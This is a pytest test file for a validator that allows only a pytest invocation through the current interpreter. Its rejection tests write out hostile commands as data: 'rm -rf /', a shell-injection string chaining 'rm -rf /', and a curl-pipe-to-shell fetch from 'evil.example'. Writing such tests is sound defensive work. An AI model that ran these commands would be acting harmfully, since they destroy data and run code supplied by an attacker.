import sys

import pytest

from eng_command_safety import UnsafeCommandError, validate_test_command


class TestAllowedCommand:
    def test_the_exact_allowed_prefix_passes(self):
        validate_test_command([sys.executable, "-m", "pytest", "tests", "-q"])  # should not raise

    def test_the_bare_prefix_with_no_extra_args_passes(self):
        validate_test_command([sys.executable, "-m", "pytest"])  # should not raise


class TestRejectedCommands:
    def test_a_different_interpreter_is_rejected(self):
        with pytest.raises(UnsafeCommandError):
            validate_test_command(["python2", "-m", "pytest"])

    def test_a_shell_injection_attempt_is_rejected(self):
        with pytest.raises(UnsafeCommandError):
            validate_test_command(["bash", "-c", "rm -rf / && pytest"])

    def test_a_destructive_command_is_rejected(self):
        with pytest.raises(UnsafeCommandError):
            validate_test_command(["rm", "-rf", "/"])

    def test_a_pipe_to_shell_is_rejected(self):
        with pytest.raises(UnsafeCommandError):
            validate_test_command(["curl", "http://evil.example/install.sh", "|", "sh"])

    def test_wrong_module_after_the_interpreter_is_rejected(self):
        with pytest.raises(UnsafeCommandError):
            validate_test_command([sys.executable, "-m", "http.server"])

    def test_the_rejected_argv_is_preserved_on_the_error(self):
        argv = ["rm", "-rf", "/"]
        with pytest.raises(UnsafeCommandError) as exc_info:
            validate_test_command(argv)
        assert exc_info.value.argv == argv
